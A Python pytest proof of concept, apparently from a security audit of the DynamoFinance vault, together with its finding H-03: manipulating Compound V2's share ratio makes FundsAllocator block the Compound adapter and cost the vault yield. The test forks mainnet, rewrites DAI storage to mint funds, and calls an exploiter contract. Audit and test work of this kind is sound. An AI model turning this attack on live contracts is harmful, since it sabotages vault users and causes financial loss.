"""
## [H-03] Malicious user can disable compound integration via share manipulation 

### Details 

It's a common assumption that Compound V2 share ratio can only ever increase but with careful manipulation it can actually be lowered. The full explanation is a bit long but you can find it [here](https://github.com/code-423n4/2023-01-reserve-findings/issues/310) in one of my public reports.

[FundsAllocator.vy#L67-L71](https://github.com/DynamoFinance/vault/blob/c331ffefadec7406829fc9f2e7f4ee7631bef6b3/contracts/FundsAllocator.vy#L67-L71)

          if pool.current < pool.last_value:
              # We've lost value in this adapter! Don't give it more money!
              blocked_adapters[blocked_pos] = pool.adapter
              blocked_pos += 1
              pool.delta = 0 # This will result in no tx being generated.

This quirk of Compound V2 can be used to trigger the check in FundsAllocator to block the Compound V2 adapter. This is useful if the user wants to push their own proposal allowing them to sabotage other users and cause loss of yield to the vault.
                    
### Lines of Code

[FundsAllocator.vy#L67-L71](https://github.com/DynamoFinance/vault/blob/c331ffefadec7406829fc9f2e7f4ee7631bef6b3/contracts/FundsAllocator.vy#L67-L71)

### Recommendation

Instead of using an absolute check, instead only block the adapter if there is reasonable loss.
"""

import pytest

import ape
from tests.conftest import ensure_hardhat, prompt
from web3 import Web3
from eth_abi import encode
import requests, json
import eth_abi
import sys
#ETH Mainnet addrs
VAULT = "0xBA12222222228d8Ba445958a75a0704d566BF2C8"
LINEARPOOL_4626_FACTORY = "0x67A25ca2350Ebf4a0C475cA74C257C94a373b828"
ZERO_ADDRESS = "0x0000000000000000000000000000000000000000"
DAI = "0x6B175474E89094C44Da98b954EedeAC495271d0F"
FRAX = "0x853d955aCEf822Db058eb8505911ED77F175b99e"

AAVE_LENDING_POOL = "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2"
ADAI = "0x018008bfb33d285247A21d44E50697654f754e63"
BTC_FRAX_PAIR = "0x32467a5fc2d72D21E8DCe990906547A2b012f382"

CDAI = "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643"

MAX_POOLS = 5 # Must match the value from Dynamo4626.vy

@pytest.fixture
def deployer(accounts):
    return accounts[0]

@pytest.fixture
def trader(accounts):
    return accounts[1]

@pytest.fixture
def attacker(accounts):
    return accounts[2]


@pytest.fixture
def cdai(project, deployer, trader, ensure_hardhat):
    return project.cToken.at(CDAI)

@pytest.fixture
def dai(project, deployer, trader, ensure_hardhat, attacker):
    dai = project.DAI.at(DAI)
    # print("wards", dai.wards(deployer))
    #Make deployer a minter
    #background info https://mixbytes.io/blog/modify-ethereum-storage-hardhats-mainnet-fork
    #Dai contract has  minters in first slot mapping (address => uint) public wards;
    abi_encoded = eth_abi.encode(['address', 'uint256'], [deployer.address, 0])
    storage_slot = Web3.solidity_keccak(["bytes"], ["0x" + abi_encoded.hex()]).hex()

    set_storage_request = {"jsonrpc": "2.0", "method": "hardhat_setStorageAt", "id": 1,
        "params": [DAI, storage_slot, "0x" + eth_abi.encode(["uint256"], [1]).hex()]}
    print(requests.post("http://localhost:8545/", json.dumps(set_storage_request)))
    # print("wards", dai.wards(deployer))
    #make the trader rich, airdrop $1 billion
    dai.mint(trader, '10000000000 Ether', sender=deployer)
    dai.mint(attacker, '10000000000 Ether', sender=deployer)
    dai.approve(VAULT, '10000000000 Ether', sender=trader)
    dai.approve(VAULT, '10000000000 Ether', sender=attacker)

    # print(dai.balanceOf(trader))
    return project.ERC20.at(DAI)

@pytest.fixture
def funds_alloc(project, deployer):
    f = deployer.deploy(project.FundsAllocator)
    return f


@pytest.fixture
def compound_adapter(project, deployer, dai, ensure_hardhat):
    ca = deployer.deploy(project.compoundAdapter, dai, CDAI)
    #we run tests against interface
    return project.LPAdapter.at(ca)

@pytest.fixture
def dynamo4626(project, deployer, trader, dai, ensure_hardhat, funds_alloc, compound_adapter):
    dynamo4626 = deployer.deploy(project.Dynamo4626, "DynamoDAI", "dyDAI", 18, dai, [], deployer, funds_alloc)
    dynamo4626.add_pool(compound_adapter, sender=deployer)
    strategy = [(ZERO_ADDRESS,0)] * 5 # This assumes Dynamo4626 MAX_POOLS == 5
    strategy[0] = (compound_adapter,1)

    dynamo4626.set_strategy(deployer, strategy, 0, sender=deployer)
    #Grant allowance for trader
    dai.approve(dynamo4626, 10000000 *10 ** 18, sender=trader)
    #Transfer some to trader.
    assert dai.allowance(trader, dynamo4626) >= 100000 *10 ** 18, "dynamo4626 does not have allowance"
    assert dai.balanceOf(trader) >= 100000 *10 ** 18, "trader is broke"
    #Previous like confirms trader has enough money
    dynamo4626.deposit(100000 *10 ** 18, trader, sender=trader)
    # ua.mint(trader, '1000000000 Ether', sender=deployer)
    # print(ua.balanceOf(trader))
    #Aprove vault
    dynamo4626.approve(VAULT, '1000000000 Ether', sender=trader)
    return dynamo4626

@pytest.fixture
def compound_exploiter(project, deployer):
    return deployer.deploy(project.CompoundExploiter)

def test_compound_issue(deployer, trader, dai, dynamo4626, compound_adapter, cdai, attacker, compound_exploiter):

    #Attacker invests in cdai by themselves...
    dai.approve(cdai, 1000*10**18, sender=attacker)
    err = cdai.mint(10*10**18, sender=attacker)
    assert err.return_value == 0
    print(cdai.balanceOfUnderlying(attacker, sender=attacker).return_value)


    # #Trader deposits to vault.  (not really needed for poc)
    # dynamo4626.deposit(100*10**18, trader, sender=trader)
    # print("totalAssets() before attack              : " , dynamo4626.totalAssets())
    # print("vaults balanceOfUnderlying before attack : " , cdai.balanceOfUnderlying(dynamo4626, sender=attacker).return_value)

    assert dynamo4626.strategy(compound_adapter).ratio == 1, "compound strategy should have ratio of 1"

    cdai.transfer(compound_exploiter, cdai.balanceOf(attacker), sender=attacker)
    dai.transfer(compound_exploiter, 10**18, sender=attacker)
    #Attacker calls an attack contract. we dont really need a contract, just that a set of operatoins must happen in same block and thats hard to do in ape+hardhat
    #amount to redeem should be: 1.98 * exchange_rate / 10e18 , and then round it
    ret = compound_exploiter.exploit(cdai, 442203165, 10, dai, dynamo4626, sender=attacker)
    print("exploiter returns: ", ret.return_value)
    for evt in ret.events:
        print(evt)
    #^ one of the events above will be PoolLoss...

    print(dynamo4626.strategy(compound_adapter).ratio)

    #Failing because of exploit
    assert dynamo4626.strategy(compound_adapter).ratio == 1, "compound strategy should have ratio of 1"

    pass

